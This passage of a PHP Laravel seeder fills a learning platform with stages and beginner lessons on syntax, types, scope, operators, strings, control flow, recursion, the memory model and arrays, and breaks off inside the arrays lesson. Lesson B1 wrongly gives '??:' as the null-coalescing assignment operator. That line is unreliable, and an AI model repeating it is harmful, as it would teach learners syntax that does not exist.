<?php

namespace Database\Seeders;

use App\Models\Checkpoint;
use App\Models\Exercise;
use App\Models\Lesson;
use App\Models\Project;
use App\Models\Stage;
use App\Models\User;
use Illuminate\Database\Seeder;

class LearningPlatformSeeder extends Seeder
{
    /**
     * Full beginner-to-senior roadmap: stages, lessons, prerequisites,
     * exercises, stage checkpoints, projects, and admin account.
     */
    public function run(): void
    {
        $stages = $this->seedStages();
        $lessons = [];

        foreach ($this->lessonBlueprints() as $blueprint) {
            $stage = $stages[$blueprint['stage']];
            $lessons[$blueprint['code']] = $this->seedLesson($stage, $blueprint);
        }

        $this->syncPrerequisites($lessons, $this->prerequisiteMap());
        $this->syncRelated($lessons, $this->relatedMap());

        foreach ($this->checkpointBlueprints() as $code => $questions) {
            $this->seedCheckpoint($lessons[$code], $questions);
        }

        $exercises = $this->exerciseBlueprints();

        foreach ($this->extraExerciseBlueprints() as $code => $more) {
            $exercises[$code] = array_merge($exercises[$code] ?? [], $more);
        }

        foreach ($exercises as $code => $list) {
            $this->seedExercises($lessons[$code], $list);
        }

        $this->seedProject($stages['stage-0']);
        $this->seedAdmin();
        $this->call(SeniorTrackSeeder::class);

        Lesson::query()
            ->where('slug', 'like', 'stage-%-overview')
            ->delete();
    }

    /** @return array<string, Stage> */
    private function seedStages(): array
    {
        $stageData = [
            ['slug' => 'stage-0', 'title' => 'Stage 0 — Computer & Program Fundamentals', 'description' => 'What a program is, how code becomes a process, CPU/RAM/storage, compiler vs interpreter, CLI vs web.', 'order_column' => 0],
            ['slug' => 'stage-1', 'title' => 'Stage 1 — PHP Language Fundamentals', 'description' => 'Syntax, types, variables, constants, expressions, operators.', 'order_column' => 1],
            ['slug' => 'stage-2', 'title' => 'Stage 2 — Control Flow & Functions', 'description' => 'Conditionals, loops, functions, scope, recursion.', 'order_column' => 2],
            ['slug' => 'stage-3', 'title' => 'Stage 3 — Memory & Runtime Model', 'description' => 'Processes, stack, heap, zvals, reference counting, references.', 'order_column' => 3],
            ['slug' => 'stage-4', 'title' => 'Stage 4 — Arrays & Strings', 'description' => 'Arrays, strings, filesystem, closures.', 'order_column' => 4],
            ['slug' => 'stage-5', 'title' => 'Stage 5 — OOP → SOLID', 'description' => 'Classes, encapsulation, inheritance, polymorphism, interfaces, composition, SOLID, namespaces.', 'order_column' => 5],
            ['slug' => 'stage-6', 'title' => 'Stage 6 — Errors & Exceptions', 'description' => 'Error model, Throwable, custom exceptions, recovery strategies.', 'order_column' => 6],
            ['slug' => 'stage-7', 'title' => 'Stage 7 — Data Structures & Algorithms', 'description' => 'Big O, searching, sorting, trees, graphs, DP patterns.', 'order_column' => 7],
            ['slug' => 'stage-8', 'title' => 'Stage 8 — Concurrency & Async', 'description' => 'Processes, threads, fibers, queues, race conditions.', 'order_column' => 8],
            ['slug' => 'stage-9', 'title' => 'Stage 9 — Testing & Code Quality', 'description' => 'Pest, unit/feature tests, Pint, static analysis.', 'order_column' => 9],
            ['slug' => 'stage-10', 'title' => 'Stage 10 — Databases & Eloquent', 'description' => 'SQL, indexes, transactions, ORM mapping, Data Mapper vs Eloquent.', 'order_column' => 10],
            ['slug' => 'stage-11', 'title' => 'Stage 11 — HTTP, Networking & Security', 'description' => 'HTTP, sessions, auth, OWASP, TLS.', 'order_column' => 11],
            ['slug' => 'stage-12', 'title' => 'Stage 12 — Backend / Laravel Production', 'description' => 'Routing, middleware, queues, cache, deploy, Git & CI.', 'order_column' => 12],
            ['slug' => 'stage-13', 'title' => 'Stage 13 — Design Patterns & Architecture', 'description' => 'Patterns, UML, enterprise patterns, DI, modular design.', 'order_column' => 13],
            ['slug' => 'stage-14', 'title' => 'Stage 14 — System Design & Production Engineering', 'description' => 'Scale, reliability, observability, incidents.', 'order_column' => 14],
            ['slug' => 'stage-15', 'title' => 'Stage 15 — Senior Interview Preparation', 'description' => 'Architecture, trade-offs, behavioral + technical drills.', 'order_column' => 15],
        ];

        $stages = [];

        foreach ($stageData as $data) {
            $stages[$data['slug']] = Stage::query()->updateOrCreate(['slug' => $data['slug']], $data);
        }

        return $stages;
    }

    /**
     * @return list<array<string, mixed>>
     */
    private function lessonBlueprints(): array
    {
        return [
            // --- Stage 0 ---
            [
                'stage' => 'stage-0', 'code' => 'A0', 'slug' => 'a0-what-a-program-is', 'order' => 0, 'sort' => 0,
                'title' => 'A0 — What a Program Is (and How It Runs)',
                'summary' => 'First principles: program, process, CPU, RAM, compiler vs interpreter, PHP CLI vs web.',
                'difficulty' => 'beginner', 'minutes' => 35, 'checkpoint' => true,
                'body' => $this->a0Body(),
            ],
            [
                'stage' => 'stage-0', 'code' => 'A1', 'slug' => 'a1-running-php', 'order' => 1, 'sort' => 1,
                'title' => 'A1 — Running PHP (CLI vs Web)',
                'summary' => 'Write and run first scripts; SAPI, stdout, process lifetime.',
                'difficulty' => 'beginner', 'minutes' => 30, 'checkpoint' => false,
                'body' => $this->a1Body(),
            ],
            [
                'stage' => 'stage-0', 'code' => 'A2', 'slug' => 'a2-basic-syntax', 'order' => 2, 'sort' => 2,
                'title' => 'A2 — Basic Syntax: Tags, Escaping, Comments',
                'summary' => '<?php tags, embedding in HTML, comments, semicolons.',
                'difficulty' => 'beginner', 'minutes' => 25, 'checkpoint' => false,
                'body' => $this->body(
                    'A2 — Basic Syntax',
                    'Stage 0 · Foundations · PHP 8.x',
                    [
                        ['PHP is HTML with pockets of code', 'A PHP file is mostly markup the browser receives as-is; computation only happens inside the pockets you open with <code>&lt;?php</code>. Everything outside those pockets is passed through untouched, which is why PHP grew up as “templates with logic” rather than as a separate templating language.'],
                        ['A file you can run in ten seconds', '<pre><code>&lt;?php\n// PHP comment\n$name = "Ada";\n?&gt;\n&lt;p&gt;Hello &lt;?= $name ?&gt;&lt;/p&gt;</code></pre> <p>Predict first: what does the browser see before the <code>Hello Ada</code>? (Answer: the literal <code>&lt;p&gt;Hello </code> text, because HTML outside PHP tags is shipped verbatim.)</p>'],
                        ['Four rules that catch everyone once', '<ul><li>Statements end with <code>;</code> — a missing one is a parse error, caught before any code runs</li><li>Forgot <code>&lt;?php</code>? Your PHP source is printed as visible text to the user</li><li>A closing tag immediately before a newline eats that newline — in pure PHP files, simply omit <code>?&gt;</code> entirely</li><li><code>//</code>, <code>#</code>, and <code>/* */</code> all comment; none of them reach the output</li></ul>'],
                        ['Escaping is a security habit, not a style choice', 'HTML outside PHP tags is literal, so output you generate must be escaped deliberately: <code>echo</code> or the short echo <code>&lt;?=</code> for markup you control, and <code>e()</code> / <code>htmlspecialchars</code> for anything a user typed. This is the XSS defense you will meet properly in L3 — starting it now costs nothing.'],
                        ['Practice it out loud', 'Write a page that prints your name and today’s date, deliberately omit <code>&lt;?php</code> once and observe the broken output, then fix it. Explain to a colleague why the error appeared as visible text instead of a stack trace.'],
                        ['Interview drill', 'What happens to text outside <code>&lt;?php</code>? Where should a pure-PHP file end — with <code>?&gt;</code> or without, and why?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-0', 'code' => 'A3', 'slug' => 'a3-types', 'order' => 3, 'sort' => 3,
                'title' => 'A3 — Types: null, bool, int, float, string',
                'summary' => 'Primitive types, casting, var_dump/gettype, type juggling traps.',
                'difficulty' => 'beginner', 'minutes' => 35, 'checkpoint' => false,
                'body' => $this->body(
                    'A3 — Types',
                    'Stage 0 · Foundations · PHP 8.x',
                    [
                        ['PHP has five scalar types you will use daily', '<table><tr><th>Type</th><th>Example</th></tr><tr><td>null</td><td><code>null</code></td></tr><tr><td>bool</td><td><code>true</code>, <code>false</code></td></tr><tr><td>int</td><td><code>42</code></td></tr><tr><td>float</td><td><code>3.14</code></td></tr><tr><td>string</td><td><code>"hi"</code></td></tr></table> <p>Arrays and objects are composite types; in PHP 8 an array is an ordered map, so “list” and “associative” are the same structure wearing different keys.</p>'],
                        ['Inspect before you trust', '<p>You cannot reason about a value you have not looked at. Run this and read the output rather than assuming:</p><pre><code>$x = "12";\nvar_dump($x);      // string(2) "12"\ngettype($x);       // "string"\n(int) $x;          // cast</code></pre> <p><strong>Predict first:</strong> what does <code>"10" + 5</code> print? (Answer: 15 — PHP coerced the string to a number. That coercion is called type juggling.)</p>'],
                        ['Type juggling is where the bugs live', 'In loose mode PHP silently converts between types: numeric strings become numbers, <code>0 == "foo"</code> was historically true, and user input from HTTP is always a string. Declare <code>declare(strict_types=1);</code> at the top of new files and the engine refuses those silent conversions — passing a numeric string where <code>int</code> is declared becomes a <code>TypeError</code> at the boundary instead of a logic bug three layers down.'],
                        ['Common mistakes, in the order beginners hit them', '<ul><li>Using <code>==</code> instead of <code>===</code> — loose comparison hides type bugs, so prefer <code>===</code> everywhere by default</li><li>Comparing floats with <code>==</code> — 0.1 + 0.2 is not 0.3 in binary floating point; compare with an epsilon</li><li>Treating empty string, null, 0, and false as “the same” — they are four different values that all happen to be falsy</li></ul>'],
                        ['Practice it out loud', 'Write three variables that all loosely equal each other under <code>==</code> but differ in type, prove it with <code>var_dump</code>, then flip on <code>strict_types</code> and watch one comparison throw.'],
                        ['Interview drill', 'What is type juggling? When do you enable <code>strict_types</code>, and what changes when you do?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-0', 'code' => 'A4', 'slug' => 'a4-variables-scope-constants', 'order' => 4, 'sort' => 4,
                'title' => 'A4 — Variables, Scope, and Constants',
                'summary' => 'Variables, local/global/static scope, const vs define().',
                'difficulty' => 'beginner', 'minutes' => 30, 'checkpoint' => true,
                'body' => $this->body(
                    'A4 — Variables, Scope, and Constants',
                    'Stage 0 · Foundations · PHP 8.x',
                    [
                        ['Variables are named boxes whose content — not name — has a type', 'Names start with <code>$</code> and PHP is dynamically typed: the variable itself has no fixed type until you assign to it, and the same variable can hold an int on line 5 and a string on line 9. This flexibility is why <code>var_dump</code> exists and why type bugs prefer to hide here.'],
                        ['Scope decides who can see the variable', '<p>Try this before reading on: write a function that assigns <code>$count = 5</code>, then try to <code>echo</code> it after the function returns — it is gone. PHP scoping rules:</p><ul><li><strong>Local</strong> — lives inside a function, dies on return</li><li><strong>Global</strong> — reachable only via <code>global $x</code> inside a function (avoid: it hides the dependency)</li><li><strong>Static</strong> — <code>static $count = 0;</code> keeps its value across calls without leaking outside</li><li><strong>Superglobals</strong> — <code>$_GET</code>, <code>$_POST</code>, <code>$_SESSION</code> are always available, no import needed</li></ul>'],
                        ['Constants are values that refuse to change', '<pre><code>const MAX = 100;          // compile-time, preferred\ndefine("APP_NAME", "PHP Learning"); // runtime\nMAX;                      // no $</code></pre> <p>Constants carry intent — <code>MAX</code> announces “this never varies” — and they protect shared configuration from accidental reassignment. <code>const</code> wins for anything known at compile time; <code>define()</code> earns its place only when the name is computed at runtime. Note the missing <code>$</code>: constants are not variables.</p>'],
                        ['Practice it out loud', 'Create a counter with <code>static</code>, call the function three times, and predict the output before you run it. Then move the counter to <code>global</code> scope and explain what got worse about the code.'],
                        ['Interview drill', '<code>const</code> vs <code>define()</code>? Local vs global scope — and why do senior developers avoid <code>global</code>?'],
                    ],
                ),
            ],

            // --- Stage 1 ---
            [
                'stage' => 'stage-1', 'code' => 'B1', 'slug' => 'b1-expressions-operators', 'order' => 0, 'sort' => 5,
                'title' => 'B1 — Expressions, Statements, Operators',
                'summary' => 'Expressions vs statements; arithmetic, comparison, logical, null coalescing, spaceship.',
                'difficulty' => 'beginner', 'minutes' => 35, 'checkpoint' => false,
                'body' => $this->body(
                    'B1 — Expressions, Statements, Operators',
                    'Stage 1 · Language Fundamentals · PHP 8.x',
                    [
                        ['The two words every code review uses', 'An <strong>expression</strong> produces a value — <code>$a + 1</code>, <code>"x"</code>, <code>strlen($s)</code> — while a <strong>statement</strong> performs an action: an assignment, an <code>if</code>, a <code>foreach</code>, terminated by <code>;</code>. You can embed an expression inside a statement, never the other way round, and this distinction explains errors like “unexpected T_IF”: the parser found a statement where it wanted a value.'],
                        ['Operator groups you will use every day', '<ul><li>Arithmetic: <code>+ - * / % **</code></li><li>Comparison: <code>== != === !== &lt;=&gt;</code></li><li>Logical: <code>&amp;&amp; || !</code> — with short-circuit: <code>$a &amp;&amp; $a-&gt;valid()</code> never calls the method when <code>$a</code> is null</li><li>Null-safe and coalescing: <code>?-&gt;</code> walks a chain and yields null instead of fataling; <code>??</code> supplies a default; <code>??:</code> assigns only when unset/null</li><li>Spaceship <code>&lt;=&gt;</code> returns -1/0/1 — the comparator shape <code>usort</code> wants</li></ul>'],
                        ['Precedence will surprise you at least once', '<p>Predict the value before running it:</p><pre><code>$a = 2 + 3 * 4;   // your instinct said 20? It is 14 — * binds tighter than +\nif ($a > 10 && $b < 5) { }</code></pre> <p>Multiplication binds tighter than addition, and comparison binds tighter than logic. When unsure — or when the next reader will be unsure — parentheses are cheaper than a bug hunt.</p>'],
                        ['How seniors actually write this', 'Prefer <code>===</code> over <code>==</code> as a default habit. Prefer early returns over deep nesting: guard the invalid cases first, then the happy path stays unindented. And treat clever one-liners as a cost — measure before trading readability for them.'],
                        ['Practice it out loud', 'Write one expression that mixes arithmetic, comparison, and logic; add parentheses until every reader can predict it without knowing precedence rules.'],
                        ['Interview drill', 'What does <code>??</code> do that <code>?-&gt;</code> does not — and when does short-circuit evaluation save you from a fatal error?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-1', 'code' => 'B2', 'slug' => 'b2-strings-deep', 'order' => 1, 'sort' => 6,
                'title' => 'B2 — Strings in Depth',
                'summary' => 'Interpolation, concatenation, heredoc/nowdoc, encoding, common str functions.',
                'difficulty' => 'beginner', 'minutes' => 30, 'checkpoint' => false,
                'body' => $this->body(
                    'B2 — Strings in Depth',
                    'Stage 1 · Language Fundamentals · PHP 8.x',
                    [
                        ['One string, four ways to write it', 'The quote style you pick changes what the engine does with the text: <pre><code>$a = \'single\';   // literal — almost no interpolation\n$b = "Hello $name"; // variables expand inside\n$c = "Hello {$obj->prop}"; // complex interpolation needs braces\n$d = &lt;&lt;&lt;TXT\nmulti-line\nTXT;\n$raw = &lt;&lt;&lt;\'RAW\'\n$not interpolated — nowdoc for template files\nRAW;</code></pre> <p>Single quotes when you mean literal text (SQL templates, regex, paths); double quotes or heredoc when the string contains values that must expand.</p>'],
                        ['The functions that cover 90% of real code', '<code>strlen</code>, <code>substr</code>, <code>str_contains</code> (PHP 8+), <code>str_starts_with</code>, <code>explode</code>/<code>implode</code>, <code>trim</code>, and <code>sprintf</code>. Together they parse, split, join, and format every string you will meet in web work — reach for these before inventing a regex.'],
                        ['A PHP string is bytes, not characters — until you treat it otherwise', 'Run <code>mb_strlen("héllo")</code> next to <code>strlen("héllo")</code> and you will see 5 versus 6: <code>strlen</code> counts bytes, and UTF-8 é occupies two. Use the <code>mb_*</code> family (<code>mb_strlen</code>, <code>mb_substr</code>, <code>mb_strtolower</code>) for user-facing text, because a naive <code>substr</code> can slice a multi-byte character in half and corrupt the output — an encoding bug that appears only when someone’s name has an accent.'],
                        ['Escaping is the XSS boundary', 'A string from a user is hostile until proven otherwise: never echo it raw into HTML or JavaScript. Escape with Laravel’s <code>e()</code> / <code>htmlspecialchars</code> at the moment of output — you will see exactly why in L3, but the habit starts with every <code>echo</code> you write now.'],
                        ['Practice it out loud', 'Take a user-entered string with an emoji and an accented name; run it through <code>strlen</code> and <code>mb_strlen</code>, split it with <code>substr</code> vs <code>mb_substr</code>, and explain the difference you observe.'],
                        ['Interview drill', '<code>strlen</code> vs <code>mb_strlen</code>? Why can plain <code>substr</code> split a UTF-8 character — and what does that do to the page?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-1', 'code' => 'B3', 'slug' => 'b3-expressions-lab', 'order' => 2, 'sort' => 7,
                'title' => 'B3 — Lab: Tip Calculator & Type Safety',
                'summary' => 'Practice operators, casting, and strict types in a small CLI.',
                'difficulty' => 'beginner', 'minutes' => 25, 'checkpoint' => true,
                'body' => $this->body(
                    'B3 — Lab: Tip Calculator',
                    'Stage 1 · Language Fundamentals · PHP 8.x',
                    [
                        ['The task: a CLI tool that must survive bad input', 'Read an amount and a tip percent from the command line, print the total per person, and — this is the real assignment — refuse garbage gracefully instead of printing a PHP warning. Real programs are judged by how they behave when the input is wrong, not by the happy path.'],
                        ['Build it in three layers', '<p>Start from this skeleton and fill in the validation:</p><pre><code>&lt;?php\ndeclare(strict_types=1);\n\nfunction total(float $amount, float $percent): float {\n    return $amount * (1 + $percent / 100);\n}\n\n// 1. read argv  →  2. validate floats &amp; reject negatives  →  3. echo formatted result\n</code></pre> <p>The typed signature is doing quiet work: with <code>strict_types=1</code>, a non-numeric argument fails loudly at the boundary instead of silently becoming 0.0 and “succeeding” with a wrong total.</p>'],
                        ['What to practise while typing', 'Reach for the operators you just learned: <code>??</code> to default a missing argument, <code>round()</code> / <code>number_format()</code> for money display (never print raw floats for currency — 19.9999999 is not money), and an explicit <code>if ($amount &lt; 0)</code> guard that prints a clear message and exits non-zero.'],
                        ['Practice it out loud', 'Run your tool with: a valid pair, a missing argument, <code>abc</code> instead of a number, and a negative amount. Four runs, four predictable behaviours — that matrix is your definition of done.'],
                        ['Interview drill', 'Why <code>declare(strict_types=1)</code>? What happens when the string <code>"abc"</code> is passed to a <code>float</code> parameter — with strict types, and without?'],
                    ],
                ),
            ],

            // --- Stage 2 ---
            [
                'stage' => 'stage-2', 'code' => 'C1', 'slug' => 'c1-control-structures', 'order' => 0, 'sort' => 8,
                'title' => 'C1 — Conditionals, match, Loops',
                'summary' => 'if/elseif, match, for/foreach/while, break/continue, early return.',
                'difficulty' => 'beginner', 'minutes' => 35, 'checkpoint' => false,
                'body' => $this->body(
                    'C1 — Control Structures',
                    'Stage 2 · Control Flow · PHP 8.x',
                    [
                        ['Branching: choose a path, then commit to it', 'A plain <code>if / elseif / else</code> chain reads top-down until one condition wins. The modern alternative is <code>match</code>, which is an <em>expression</em> (it returns a value) and compares strictly with <code>===</code>:<pre><code>$result = match ($status) {\n    200 => "ok",\n    404 => "missing",\n    default => "error",\n};</code></pre> <p>Predict first: what happens if <code>$status</code> is 405 and there is no <code>default</code>? PHP throws <code>UnhandledMatchError</code> — <code>match</code> refuses to silently return null the way a missed <code>switch</code> falls through. That strictness is the point: an unexpected value becomes a visible error instead of a quiet wrong answer.</p>'],
                        ['Loops: prefer foreach for anything list-shaped', '<pre><code>foreach ($items as $i => $item) {}\nfor ($i = 0; $i < 10; $i++) {}\nwhile ($cond) {}\ndo {} while ($cond);</code></pre> <p><code>foreach</code> owns arrays — it hands you each element (and its key) without index arithmetic to get wrong. Reserve <code>for</code> for numeric ranges, <code>while</code> for “until a condition flips”, and remember <code>do/while</code> is the only loop that runs its body at least once.</p>'],
                        ['Escape hatches that flatten nesting', '<code>break</code> exits the innermost loop; <code>continue</code> skips to the next iteration; <code>break 2</code> climbs out of nested loops. But the real nesting-killer is the early <code>return</code>: handle invalid cases first, and the happy path runs without a single <code>else</code>.'],
                        ['The pattern that ruins long functions', 'Deep <code>else</code> pyramids — four levels of indentation where each branch only adds a condition — signal it is time to extract functions or invert to guard clauses. You will refactor this exact shape in N3; recognising it now is half the battle.'],
                        ['Practice it out loud', 'Rewrite a nested if/else pyramid as guards plus a <code>match</code>, then explain which version a teammate would debug faster at 2 a.m.'],
                        ['Interview drill', '<code>match</code> vs <code>switch</code>? What does <code>match</code> return — and what happens when no arm matches?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-2', 'code' => 'C2', 'slug' => 'c2-functions', 'order' => 1, 'sort' => 9,
                'title' => 'C2 — Functions: Parameters, Returns, Scope',
                'summary' => 'Params, defaults, variadics, by-value vs by-ref, return types, pure vs side effects.',
                'difficulty' => 'beginner', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'C2 — Functions',
                    'Stage 2 · Control Flow · PHP 8.x',
                    [
                        ['A function is a named recipe with a contract', 'Parameters are the inputs, the return type is the output, and the signature documents both for every future reader — and for the type checker. Defaults make optional inputs explicit, and variadics collect the rest: <pre><code>function greet(string $name, string $prefix = "Hi"): string {\n    return "{$prefix}, {$name}";\n}\n\nfunction sum(int ...$nums): int {\n    return array_sum($nums);\n}</code></pre> <p>Notice what the signature <em>prevents</em>: calling <code>greet(42)</code> under strict types fails immediately, at the boundary, with a TypeError naming the exact parameter — instead of producing "Hi, 42" three layers downstream.</p>'],
                        ['Copying vs mutating: the call you make either way', '<pre><code>function bump(int $n) { $n++; }        // caller\'s $n is untouched\nfunction bumpRef(int &$n) { $n++; } // caller\'s $n changes</code></pre> <p>By-value is the default and the safe choice: the caller can reason about their variable without wondering who else has a handle on it. By-reference is correct when the update <em>is</em> the point — think PHP\'s own <code>sort()</code>, which must rearrange the caller\'s array — and dangerous everywhere else, because a hidden mutation is a bug you will hunt later. Prefer returning new values; use <code>&amp;</code> only when you mean in-place update.</p>'],
                        ['Every call spends stack — and eventually someone runs out', 'Each call pushes a frame holding arguments and local variables; returning pops it. Deep recursion without a bounded base case does not politely stop — it hits the stack limit and throws an <code>Error</code>. When the depth is unknown (tree walks on user data), iteration or an explicit work-stack is the safer shape.'],
                        ['Pure functions are the ones you can trust', 'A pure function maps the same input to the same output and touches nothing else — no globals, no clock, no randomness. Those are the functions you can unit-test in isolation and memoise later. Impure work (I/O, randomness, time) belongs at the edges of the program, wrapped around a pure core. This split is the design lesson underneath the syntax.'],
                        ['Practice it out loud', 'Convert one impure function of yours into a pure one plus a thin impure wrapper, then list which bugs became impossible.'],
                        ['Interview drill', 'What is a side effect? When is passing by reference the correct choice — and when is it a trap?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-2', 'code' => 'C3', 'slug' => 'c3-recursion-scope', 'order' => 2, 'sort' => 10,
                'title' => 'C3 — Recursion, Scope, Modular Design',
                'summary' => 'Base case + recursive case; stack depth; splitting scripts into modules.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => true,
                'body' => $this->body(
                    'C3 — Recursion & Modular Design',
                    'Stage 2 · Control Flow · PHP 8.x',
                    [
                        ['Recursion: a function that trusts a smaller version of itself', 'Two ingredients and nothing more — a <strong>base case</strong> that answers directly without recursing, and a <strong>recursive case</strong> that reduces the problem toward that base: <pre><code>function fact(int $n): int {\n    if ($n &lt;= 1) { return 1; } // base case — no recursion\n    return $n * fact($n - 1);   // recursive case — smaller n\n}</code></pre> <p>Predict first: what does <code>fact(0)</code> return? Without the <code>$n &lt;= 1</code> guard it would recurse forever — the base case is not decoration, it is the termination proof. Trace <code>fact(4)</code> on paper: each line of the call stack waits for the line below it to answer.</p>'],
                        ['The stack is real, finite, and unforgiving', 'Every call allocates a frame; frames nest until the base case starts returning values back up. Unbounded recursion — no guard, or depth driven by user input — exhausts the stack and PHP throws an <code>Error</code> rather than corrupting memory. When the depth is unknown at design time, prefer iteration: a loop has no frame cost per element.'],
                        ['Modular design: one job per function', 'Most scripts grow by accretion — parse, validate, compute, and print all tangled in one 80-line block. The fix is to cut along responsibility lines: <code>parseInput()</code>, <code>validate()</code>, <code>compute()</code>, <code>present()</code>. Each piece gets a name you can say out loud, a signature you can test alone, and a single reason to change. You practiced the same cut in B3 without the vocabulary; now it has one.'],
                        ['The refactor drill that builds the habit', 'Take any 40-line script you have written and extract four typed functions from it — no behaviour change, only structure. Run it before and after; identical output means the refactor succeeded. This exact exercise reappears as N3’s core skill: behaviour-preserving transformation under a green test suite.'],
                        ['Practice it out loud', 'Trace <code>fact(4)</code> call by call — write each frame as it pushes and pops — then explain where a missing base case would blow the stack.'],
                        ['Interview drill', 'Walk the call stack for <code>fact(4)</code>: which frame returns first, and what value does each level contribute?'],
                    ],
                ),
            ],

            // --- Stage 3 ---
            [
                'stage' => 'stage-3', 'code' => 'D1', 'slug' => 'd1-memory-model', 'order' => 0, 'sort' => 11,
                'title' => 'D1 — PHP Memory Model (zvals, Refcount, COW)',
                'summary' => 'Request lifecycle, stack/heap intuition, zvals, reference counting, copy-on-write.',
                'difficulty' => 'intermediate', 'minutes' => 45, 'checkpoint' => false,
                'body' => $this->body(
                    'D1 — PHP Memory Model',
                    'Stage 3 · Memory & Runtime · PHP 8.x',
                    [
                        ['Picture the request before you learn the vocabulary', 'One HTTP request (or one CLI run) gives the engine a private workspace. Everything you will study in this lesson lives in this sketch: <pre><code>Request / Process\n  ├── Code (opcodes)\n  ├── Stack  (call frames, locals)\n  ├── Heap   (arrays, objects, long strings)\n  └── Data   (symbol tables, constants)</code></pre> <p>The stack holds the short-lived stuff — each function\'s arguments and locals, pushed on call and popped on return. The heap holds anything that outlives a single frame: arrays, objects, strings grown at runtime. When a request ends, the whole workspace is thrown away — that is the "shared-nothing" model you met in A1, now with a picture.</p>'],
                        ['A zval is PHP\'s wrapper around a value', 'Every variable in PHP is a <strong>zval</strong>: a small tagged record holding the type plus the value itself (for cheap types) or a pointer to it (for arrays, objects, long strings). Integers, booleans, and null cost a few bytes and live inline; arrays and objects are allocated on the heap and referenced from the zval. This split explains why copying an array feels different from copying an int — you will see exactly that next.'],
                        ['Reference counting frees memory — eventually', 'Each heap value carries a refcount: how many zvals currently point at it. Assign <code>$b = $a</code> for an array and the count rises; unset a variable and it falls. When it hits zero, the value is freed immediately. The word "eventually" hides the caveat: values that point at <em>themselves</em> (a cycle) never reach zero, so PHP runs a separate cycle collector to sweep them. Until it runs, a cycle is a leak you can observe with <code>memory_get_usage()</code>.'],
                        ['Copy-on-write: sharing until someone writes', '<p>Run this and predict <code>$a</code> after the third line:</p><pre><code>$a = [1,2,3];\n$b = $a;     // shared — no copy yet, refcount = 2\n$b[] = 4;    // write! $b separates — $a stays [1,2,3]</code></pre> <p>This is <strong>copy-on-write (COW)</strong>: assignment of arrays and objects shares storage for free, and the engine only copies at the moment one holder mutates. It is why passing a big array by value is cheap in practice — until you modify it. In an interview, "PHP shares array values and copies lazily on write" is a precise, senior answer.</p>'],
                        ['References (&) opt out of the safety', '<code>$b = &amp;$a;</code> makes two zvals point at the <em>same storage</em> — writes through either are visible to both, with no separation ever. Powerful for in-place algorithms, and dangerous everywhere else: aliasing bugs are silent because the mutation happens somewhere else in the file. Default to COW; reach for <code>&amp;</code> only when in-place mutation is the explicit goal.'],
                        ['What PHP protects you from — and what it does not', 'There is no manual free: unsetting the last reference releases memory automatically. You can still hit out-of-memory fatals (long-lived processes, huge queries held in memory) and transient leaks from cycles — which is why <code>memory_get_usage()</code> exists as a debugging tool.'],
                        ['Practice it out loud', 'Write the COW snippet, add <code>var_dump</code> at each step, then use <code>xdebug_debug_zval()</code> (or reason from refcounts) to explain when the copy actually happened.'],
                        ['Interview drill', 'What is copy-on-write? Why can a reference cycle leak memory even though PHP "manages memory for you"?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-3', 'code' => 'D2', 'slug' => 'd2-scope-lifetime', 'order' => 1, 'sort' => 12,
                'title' => 'D2 — Scope, Lifetime, References in Practice',
                'summary' => 'When variables die; static; passing by ref; debugging memory.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => true,
                'body' => $this->body(
                    'D2 — Scope & Lifetime',
                    'Stage 3 · Memory & Runtime · PHP 8.x',
                    [
                        ['Scope asks "where can I see it?" — lifetime asks "when does it die?"', 'Two different questions that produce the same confusing bug. A local variable is visible only inside its function and dies the moment the function returns. Superglobals (<code>$_GET</code>, <code>$_SESSION</code>) live for the whole request. An object lives exactly as long as something references it — last reference gone, object destroyed. Knowing which clock you are on turns "my variable vanished" from a mystery into an expectation.'],
                        ['static keeps a value across calls without going global', '<p>Predict the output of three calls to this function:</p><pre><code>function hits(): int {\n    static $c = 0;\n    return ++$c;\n}\n// hits() → 1, hits() → 2, hits() → 3</code></pre> <p>The <code>static</code> variable is initialized once and persists between calls, but its name is still only visible inside the function — a private memo, not a global. That is the distinction that makes <code>static</code> acceptable where <code>global $c</code> would be a review comment.</p>'],
                        ['Shared mutation through references is where trust breaks down', '<pre><code>function add(&amp;$arr, $v) { $arr[] = $v; }\n// the caller\'s array changed — but nothing in the call site says so</code></pre> <p>Nothing at <code>add($list, $x)</code> hints that <code>$list</code> will be modified. Multiply that by ten helpers and no one can predict what a variable holds after any line — the debugging cost is paid daily. The senior habit: let functions return values and let callers assign them, reserving <code>&amp;</code> for a deliberate, documented in-place update.</p>'],
                        ['Two instruments for watching memory', 'Logic bugs: <code>xdebug</code> step-through or a well-placed <code>dd()</code> to inspect state at a moment in time. Memory questions: <code>memory_get_usage()</code> for current bytes and <code>memory_get_peak_usage()</code> for the high-water mark — wrap a suspicious section with both and the difference tells you what it allocated. Reach for the second instrument only when the first says "the logic is correct but memory climbs".'],
                        ['Practice it out loud', 'Write the <code>hits()</code> function, predict its output, then convert it to <code>global</code> and explain exactly what became harder to reason about.'],
                        ['Interview drill', 'Explain value assignment versus reference assignment with a diagram — what does each zval point at after <code>$b = $a</code> versus <code>$b = &amp;$a</code>?'],
                    ],
                ),
            ],

            // --- Stage 4 ---
            [
                'stage' => 'stage-4', 'code' => 'E1', 'slug' => 'e1-arrays', 'order' => 0, 'sort' => 13,
                'title' => 'E1 — Arrays: List, Assoc, Multi',
                'summary' => 'PHP arrays as maps; array_* toolkit; iteration patterns; when to use structures.',
                'difficulty' => 'beginner', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'E1 — Arrays',
                    'Stage 4 · Arrays & Strings · PHP 8.x',
                    [
                        ['One structure pretending to be three', 'PHP has no separate list type, no map type, no vector — just an <strong>ordered key→value map</strong>. Numeric keys make it look like a list, string keys make it look like a dictionary, nesting makes it a tree, and all three are the same structure underneath. This is enormous practical leverage (one <code>array_*</code> toolbox works everywhere) and the source of the model confusion below: know which <em>shape</em> you intend before you index into it.'],
